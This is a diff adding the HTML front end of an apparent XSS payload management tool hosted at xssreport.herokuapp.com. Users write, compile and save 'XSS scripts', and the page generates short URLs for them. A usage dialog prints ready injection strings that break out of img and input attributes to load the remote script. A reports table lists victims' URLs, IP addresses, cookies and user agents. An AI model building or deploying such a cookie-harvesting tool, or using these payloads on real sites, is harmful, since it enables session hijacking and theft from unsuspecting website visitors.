@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
+  <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/js/bootstrap.min.js"></script>
+  <script src="//cdn.jsdelivr.net/codemirror/2.36/codemirror.js"></script>
+  <script src="//cdn.jsdelivr.net/codemirror/2.36/util/loadmode.js"></script>
+  <script src="//cdn.jsdelivr.net/codemirror/2.36/util/runmode.js"></script>
+  <script src="//cdn.jsdelivr.net/codemirror/2.36/util/simple-hint.js"></script>
+  <script src="//cdn.jsdelivr.net/codemirror/2.36/util/javascript-hint.js"></script>
+  <script src="http://codemirror.net/mode/javascript/javascript.js"></script>
+  <script src="http://codemirror.net/mode/coffeescript/coffeescript.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/underscore.js/1.4.3/underscore-min.js"></script>
+  <script src="http://backbonejs.org/backbone.js"></script>
+  <script src="https://raw.github.com/addyosmani/backbone.paginator/master/dist/backbone.paginator.min.js"></script>
+  <script src="http://jashkenas.github.com/coffee-script/extras/coffee-script.js"></script>
+  <script src="http://fgnass.github.com/spin.js/dist/spin.min.js"></script>
+  <script src="https://gist.github.com/raw/1290439/ce7face0309bdb265244e8483ce91dcf86e8cb14/jquery.spin.js"></script>
+  <script src="http://softwaremaniacs.org/media/soft/highlight/highlight.pack.js"></script>
+  <script src="https://raw.github.com/Trenker/Browser-UglifyJS/master/build/uglifyjs.1.2.5.min.js"></script>
+  <!-- <link href="http://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/2.0.4/css/bootstrap.min.css" rel="stylesheet"> -->
+  <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/css/bootstrap-combined.min.css" rel="stylesheet">
+  <!-- <link href="//netdna.bootstrapcdn.com/bootswatch/2.1.1/spruce/bootstrap.min.css" rel="stylesheet"> -->
+  <!-- <link href="//netdna.bootstrapcdn.com/bootswatch/2.1.1/cosmo/bootstrap.min.css" rel="stylesheet"> -->
+  <link href="http://cdn.jsdelivr.net/codemirror/2.36/util/simple-hint.css" rel="stylesheet">
+  <link href="//cdn.jsdelivr.net/codemirror/2.36/codemirror.css" rel="stylesheet">
+  <script src="manage.js"></script>
+</head>
+<body>
+  <script type="text/underscore-template" id="script-edit-template">
+    <form class="form-horizontal"><fieldset>
+      <div class="row">
+        <legend>Edit your XSS script.</legend>
+        <div class="control-group">
+          <label class="control-label" for="name">Name</label>
+          <div class="controls">
+            <input class="input-medium" id="name" type="text" value="<%- name %>"></input>
+          </div>
+        </div>
+        <div class="control-group">
+          <label class="control-label" for="uri" required>URI</label>
+          <div class="controls">
+            <div class="input-prepend">
+              <span class="add-on">http://xssreport.herokuapp.com/x/</span>
+              <input class="input-small" id="uri" type="text" value="<%- uri %>"></input>
+            </div>
+          </div>
+        </div>
+        <div class="control-group">
+          <label class="control-label" for="name">Short URL</label>
+          <div class="controls">
+            <input class="input-medium" id="short-url" type="text" value="<%- short_url %>"></input>
+            <div class="btn-group">
+              <button class="btn dropdown-toggle" data-toggle="dropdown">
+                Generate
+                <span class="caret"></span>
+              </button>
+              <ul class="dropdown-menu">
+                <li><a class="shorten-google" href="#">Google (goo.gl)</a></li>
+              </ul>
+          </div>
+        </div>
+      </div>
+      <div class="row">
+        <div class="span7">
+          <textarea class="code-editor"></textarea>
+        </div>
+        <div class="span5">
+          <textarea class="compiled"></textarea>
+        </div>
+      </div>
+      <div class="row">
+        <div class="span12"><div class="alert alert-error" id="error" style="display:none"></div></div>
+      </div>
+      <div class="row">
+        <div class="span2"><a class="btn btn-primary compile">Compile</a></div>
+        <div class="span2"><a class="btn compress">Compress</a></div>
+        <div class="span2"><a class="btn btn-danger run">Run</a></div>
+        <div class="span2"><a class="btn btn-success save">Save</a></div>
+      </div>
+    </fieldset></form>
+  </script>
+  <script type="text/underscore-template" id="scripts-list-template">
+    <div class="row clearfix">
+      <div class="pull-right">
+        <a class="btn btn-small refresh" href="#"><i class="icon-refresh"></i> Refresh</a>
+        <a class="btn btn-small add-script" href="#"><i class="icon-plus"></i> Create New Script</a>
+      </div>
+    </div>
+    <div class="row">
+      <table class="table table-hover">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Name</th>
+            <th>URI</th>
+            <th>Short URL</th>
+            <th>Created</th>
+            <th>Last Modified</th>
+            <th>Options</th>
+          </tr>
+        </thead>
+        <tbody>
+          <% _.each(items, function(item) { %>
+            <tr data-id="<%- item.id %>">
+              <td><%- item.id %></td>
+              <td><%- item.name %></td>
+              <td><%- item.uri %></td>
+              <td><a href="<%- item.short_url %>"><%- item.short_url %></a></td>
+              <td><%- item.created %></td>
+              <td><%- item.last_edited %></td>
+              <td>
+                <div class="btn-group">
+                  <a class="btn use-script" href="#"><i class="icon-user icon-info-sign"></i> Show Usage</a>
+                  <a class="btn dropdown-toggle" data-toggle="dropdown" href="#"><span class="caret"></span></a>
+                  <ul class="dropdown-menu">
+                    <li><a class="edit-script" href="#"><i class="icon-pencil"></i> Edit</a></li>
+                    <li><a class="remove-script" href="#"><i class="icon-trash"></i> Delete</a></li>
+                    <li><a class="duplicate-script" href="#"><i class="icon-file"></i> Duplicate</a></li>
+                  </ul>
+                </div>
+              </td>
+            </tr>
+          <% }); %>
+        </tbody>
+      </table>
+      <ul class="pager">
+        <li class="previous"><a href="#" class="previous-page">← Previous</a></li>
+        <li class="next"><a href="#" class="next-page">Next →</a></li>
+      </ul>
+      <div class="modal hide fade" role="dialog"></div>
+    </div>
+  </script>
+  <script type="text/underscore-template" id="script-usage-template">
+    <div class="modal-header">
+      <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+      <h3 id="myModalLabel">Usage for &quot;<%- uri %>&quot;</h3>
+    </div>
+    <div class="modal-body">
+      <% url = short_url || "http://xssreport.herokuapp.com/x/" + uri %>
+      <h5>Standard non-filtered</h5>
+      <pre><code class="html">&lt;script src=&quot;<%- url %>&quot;&gt;&lt;/script&gt;</code></pre>
+      <h5>In url attribute of &lt;img&gt;</h5>
+      <pre><code class="html">&quot;&gt;&lt;/img&gt;&lt;script src=&quot;<%- url %>&quot;&gt;&lt;/script&gt;&lt;img d=&quot;</code></pre>
+      <h5>In value attribute of &lt;input&gt;</h5>
+      <pre><code class="html">&quot;&gt;&lt;/input&gt;&lt;script src=&quot;<%- url %>&quot;&gt;&lt;/script&gt;&lt;input value=&quot;</code></pre>
+    </div>
+  </script>
+  <script type="text/underscore-template" id="reports-list-template">
+    <div class="row">
+      <table class="table table-hover table-condensed">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>URL</th>
+            <th>Created</th>
+            <th>IP</th>
+            <th>Cookie</th>
+            <th>UserAgent</th>
+          </tr>
+        </thead>
+        <tbody>
+          <% _.each(items, function(item) { %>
+            <tr data-id="<%- item.id %>">
+              <td><%- item.id %></td>
+              <td><%- item.url %></td>
+              <td><%- item.created %></td>
+              <td><%- item.remote_ip %></a></td>
+              <td><%- item.cookie %></td>
+              <td><%- item.useragent %></td>
+            </tr>
+          <% }); %>
+        </tbody>
+      </table>
+      <ul class="pager">
+        <li class="previous"><a href="#" class="previous-page">← Previous</a></li>
+        <li class="next"><a href="#" class="next-page">Next →</a></li>
+      </ul>
+    </div>
+  </script>
+  <div class="container">
+    <div class="">
+      <div class="alert alert-success global-flash" style="display:none; ">
+        <a class="close">×</a>
+        <strong>Success</strong>
+      </div>
+      <div class="app" style="min-height: 400px;">
+      </div>
+      <div class="row footer">
+        <div class="muted" align="middle">
+          <p>Copyright</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
